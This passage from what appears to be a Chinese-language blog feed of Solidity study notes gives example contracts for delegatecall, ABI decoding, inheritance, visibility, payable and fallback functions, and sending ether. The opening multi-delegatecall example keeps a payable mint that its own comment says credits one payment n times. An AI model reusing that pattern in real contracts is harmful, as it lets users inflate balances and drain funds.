class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract Helper&#123;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">getData1</span><span class="params">(uint x,uint y)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func1()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(TestMultiDelegatecall.func1.selector,x,y);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   function <span class="title function_">getData2</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func2()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(TestMultiDelegatecall.func2.selector);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">getMintData</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(TestMultiDelegatecall.mint.selector);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MultiDelegatecall&#123;</span><br><span class="line">  function <span class="title function_">multicallDelegatecall</span><span class="params">(bytes[]memory data)</span></span><br><span class="line">    external payable <span class="title function_">returns</span><span class="params">(bytes[] memory)</span></span><br><span class="line">  &#123;</span><br><span class="line">     bytes[]memory results=new bytes[](data.length);</span><br><span class="line">    <span class="keyword">for</span>(uint i;i&lt;data.length;i++)&#123;</span><br><span class="line">      (<span class="type">bool</span> ok,bytes memory result)=address(this).delegatecall(data[i]);</span><br><span class="line">      require(ok,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">      results[i]=result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestMultiDelegatecall is MultiDelegatecall&#123;</span><br><span class="line">  mapping(address=&gt;uint)public balanceOf;</span><br><span class="line">  event <span class="title function_">Log</span><span class="params">(address caller,<span class="built_in">string</span> func,uint i)</span>;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">func1</span><span class="params">(uint x,uint y)</span>external&#123;</span><br><span class="line">    emit <span class="title function_">Log</span><span class="params">(msg.sender,<span class="string">&quot;func1&quot;</span>,x+y)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">func2</span><span class="params">()</span>external <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">    emit <span class="title function_">Log</span><span class="params">(msg.sender,<span class="string">&quot;func2&quot;</span>,<span class="number">2</span>)</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">mint</span><span class="params">()</span>external payable&#123;</span><br><span class="line">    balanceOf[msg.sender]+=msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果在本合约中多重委托调用mint，则输入一次msg.value账户的balanceOf会增加n次</span></span><br><span class="line">  <span class="comment">//n就是多重调用的次数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="abi解码"><a href="#abi解码" class="headerlink" title="abi解码"></a>abi解码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract AbiDecode&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span>&#123;</span></span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    uint[<span class="number">2</span>] nums;</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">encode</span><span class="params">(uint x,address addr,uint[]calldata arr,MyStruct calldata myStruct)</span></span><br><span class="line">    external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> abi.encode(x,addr,arr,myStruct);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解码函数</span></span><br><span class="line">  function <span class="title function_">decode</span><span class="params">(bytes calldata data)</span>external pure <span class="title function_">returns</span><span class="params">(</span></span><br><span class="line"><span class="params">    uint x,address addr,uint[]memory arr,MyStruct memory myStruct</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">  &#123;</span><br><span class="line">    (x,addr,arr,myStruct)=abi.decode(data,(uint,address,uint[],MyStruct));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的第二篇文章</title>
      <link href="/2022/10/28/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/28/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      
      
      <categories>
          
          <category> -c语言学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（二）</title>
      <link href="/2022/10/28/solidity/(%E4%BA%8C)solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/10/28/solidity/(%E4%BA%8C)solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity基础知识点（二）"><a href="#solidity基础知识点（二）" class="headerlink" title="solidity基础知识点（二）"></a>solidity基础知识点（二）</h1><h2 id="事件知识点"><a href="#事件知识点" class="headerlink" title="事件知识点"></a>事件知识点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Event &#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> message,uint val)</span>;</span><br><span class="line">    event <span class="title function_">IndexedLog</span><span class="params">(address indexed sender,uint val)</span>;</span><br><span class="line">    function <span class="title function_">example</span><span class="params">()</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;foo&quot;</span>,<span class="number">123</span>)</span>;</span><br><span class="line">        emit <span class="title function_">IndexedLog</span><span class="params">(msg.sender,<span class="number">123</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event <span class="title function_">Message</span><span class="params">(address indexed _from,address indexed _to,<span class="built_in">string</span> message)</span>;</span><br><span class="line">    function <span class="title function_">sendMessage</span><span class="params">(address _to,<span class="built_in">string</span> calldata message)</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Message</span><span class="params">(msg.sender,_to,message)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承与多线继承"><a href="#继承与多线继承" class="headerlink" title="继承与多线继承"></a>继承与多线继承</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span>  public  virtual <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;<span class="comment">//需要被继承的合约要加virtual</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public virtual <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Aa</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract B is A&#123;</span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span> public virtual override <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;<span class="comment">//加继承的函数加override</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public virtual override <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Bb</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract C is A, B&#123;<span class="comment">//多线继承，最基础的放在最前面，然后依次排列</span></span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span>public pure <span class="title function_">override</span><span class="params">(A,B)</span> <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public pure <span class="title function_">override</span> <span class="params">(A,B)</span><span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承构造函数传入参数的知识"><a href="#继承构造函数传入参数的知识" class="headerlink" title="继承构造函数传入参数的知识"></a>继承构造函数传入参数的知识</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract S&#123;</span><br><span class="line">    <span class="built_in">string</span> public name;</span><br><span class="line">    constructor(<span class="built_in">string</span> memory _name)&#123;</span><br><span class="line">        name=_name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract T&#123;</span><br><span class="line">    <span class="built_in">string</span> public text;</span><br><span class="line">    constructor(<span class="built_in">string</span> memory _text)&#123;</span><br><span class="line">        text=_text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract U is <span class="title function_">S</span><span class="params">(<span class="string">&quot;S&quot;</span>)</span>,<span class="title function_">T</span><span class="params">(<span class="string">&quot;t&quot;</span>)</span>&#123;<span class="comment">//已知输入内容</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">contract V is S ,T&#123;<span class="comment">//按照继承的顺序来运行，所以先传入S，后传入T</span></span><br><span class="line">    constructor(<span class="built_in">string</span> memory _name,<span class="built_in">string</span> memory _text )S(_name) T(_text)&#123;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="comment">//构造函数时传入 当然U和V这两种方法是可以合并的</span></span><br></pre></td></tr></table></figure><h2 id="如何调用父级合约"><a href="#如何调用父级合约" class="headerlink" title="如何调用父级合约"></a>如何调用父级合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">contract E&#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> msesage)</span>;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;E.foo&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span><span class="params">()</span>public virtual &#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;E.bar&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract F is E&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;F.foo&quot;</span>)</span>;</span><br><span class="line">        E.foo();<span class="comment">//直接调用v</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span> <span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;F.bar&quot;</span>)</span>;</span><br><span class="line">        super.bar();<span class="comment">//super方法调用，自己会寻找父级合约</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract G is E&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;G.foo&quot;</span>)</span>;</span><br><span class="line">        E.foo();</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;G.bar&quot;</span>)</span>;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract H is F, G&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public <span class="title function_">override</span><span class="params">(F,G)</span>&#123;</span><br><span class="line">        F.foo();<span class="comment">//直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span> <span class="params">()</span>public <span class="title function_">override</span><span class="params">(F,G)</span>&#123;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可视范围知识点"><a href="#可视范围知识点" class="headerlink" title="可视范围知识点"></a>可视范围知识点</h2><p>-private  只能合约内部可见<br>-internal 只能内部或者被继承的子合约中可见<br>-public  内外部均可见<br>-external 只能从外部可见，继承子合约中不可见</p><p>1.如果有一个外部合约C调用一个合约A，那么C合约只能看到A合约的public与external合约函数，其他都不行<br>2.继承只能看到internal和public<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract visibility&#123;</span><br><span class="line">    uint private x=<span class="number">0</span>;</span><br><span class="line">    uint internal y=<span class="number">1</span>;</span><br><span class="line">    uint public z=<span class="number">2</span>;</span><br><span class="line">    function <span class="title function_">privateFunc</span><span class="params">()</span>private pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">internalFunc</span><span class="params">()</span>internal pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">publicFunc</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">200</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">externalFunc</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external view&#123;</span><br><span class="line">        x+y+z;</span><br><span class="line">        privateFunc();</span><br><span class="line">        internalFunc();</span><br><span class="line">        publicFunc();</span><br><span class="line">        this.externalFunc();<span class="comment">//可以通过这样来访问外部函数。原理:先到合约外部在到内部从而访问external函数。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="不可变量"><a href="#不可变量" class="headerlink" title="不可变量"></a>不可变量</h2><p>不可变量immutable用的时候必须赋值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Immutable&#123;</span><br><span class="line">    address public immutable owner = msg.sender;<span class="comment">//像定义常量一样节约gas费，同样owner永不可变</span></span><br><span class="line">   <span class="comment">// constructor()&#123;</span></span><br><span class="line">    <span class="comment">//    owner=msg.sender;可在构建函数时赋值 </span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    uint public x;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>external&#123;</span><br><span class="line">        require (msg.sender == owner);</span><br><span class="line">        x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="支付payable属性与回退函数运用"><a href="#支付payable属性与回退函数运用" class="headerlink" title="支付payable属性与回退函数运用"></a>支付payable属性与回退函数运用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract Payable&#123;</span><br><span class="line">    address payable public owner;<span class="comment">//这样的话就可以发送钱了</span></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner =payable(msg.sender);</span><br><span class="line">        <span class="comment">//owner=msg.sender ;这样不行    //因为owner有payable的属性，所以构造函数要有payable的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">deposit</span><span class="params">()</span>external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">getBalance</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回退函数</span></span><br><span class="line"></span><br><span class="line">contract Fallback&#123;<span class="comment">//有数据则会触发fallback</span></span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> func,address sender,uint value,bytes  data)</span>;</span><br><span class="line">    fallback()external payable&#123;<span class="comment">//可接受主币的发送</span></span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;fallback&quot;</span>,msg.sender,msg.value,msg.data)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;<span class="comment">//无数据则会触发receive，如果没有receive则会触发fallback</span></span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;receive&quot;</span>,msg.sender,msg.value,<span class="string">&quot;&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="发送以太币三种方法"><a href="#发送以太币三种方法" class="headerlink" title="发送以太币三种方法"></a>发送以太币三种方法</h2><p>· transfer 2300 gas,reverts<br>· sender -2300 gas returns  bool<br>· call - all gas,returns bool and data<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract SendEther&#123;</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">sendtrsndfer</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        _to.transfer(<span class="number">123</span>);<span class="comment">//代表123wei</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">sendsend</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        <span class="type">bool</span> send=_to.send(<span class="number">123</span>);</span><br><span class="line">        require(send,<span class="string">&quot;send failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">sendcall</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success,)=_to.call&#123;value:<span class="number">123</span>&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        require(success,<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="制作一个以太坊钱包"><a href="#制作一个以太坊钱包" class="headerlink" title="制作一个以太坊钱包"></a>制作一个以太坊钱包</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract EtherWallet&#123;</span><br><span class="line">    address payable public  owner;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner=payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">(uint _amount)</span>external&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;caller is not owner&quot;</span>);</span><br><span class="line">        owner.transfer(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过一个合约地址调用另一个合约"><a href="#通过一个合约地址调用另一个合约" class="headerlink" title="通过一个合约地址调用另一个合约"></a>通过一个合约地址调用另一个合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">contract callTestContract&#123;</span><br><span class="line">    function <span class="title function_">setx1</span><span class="params">(address _test,uint _x)</span>external&#123;</span><br><span class="line">        TestContract(_test).setx(_x);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setx2</span><span class="params">(TestContract _test,uint _x)</span>external&#123;</span><br><span class="line">        _test.setx(_x);<span class="comment">//两种方法都可以</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getx</span><span class="params">(address _test)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TestContract(_test).getx();</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setxandReceiveEther</span><span class="params">(address _test,uint _x)</span>external payable&#123;</span><br><span class="line">        TestContract(_test).setxandReceiveEther&#123;value:msg.value&#125;(_x);<span class="comment">//传入value的值</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getxandValue</span><span class="params">(address _test)</span>external view <span class="title function_">returns</span><span class="params">(uint x,uint value)</span>&#123;</span><br><span class="line">        (x,value)=TestContract(_test).getxandValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestContract&#123;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public value=<span class="number">123</span>;</span><br><span class="line">    function <span class="title function_">setx</span><span class="params">(uint _x)</span>external&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getx</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setxandReceiveEther</span><span class="params">(uint _x)</span>external payable&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        value=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getxandValue</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint, uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>当不知到一个合约源代码时可以用接口合约调用其中的函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">interface ICounter&#123;</span><br><span class="line">    function <span class="title function_">count</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external;</span><br><span class="line">&#125;</span><br><span class="line">contract CallInterface&#123;</span><br><span class="line">    uint public 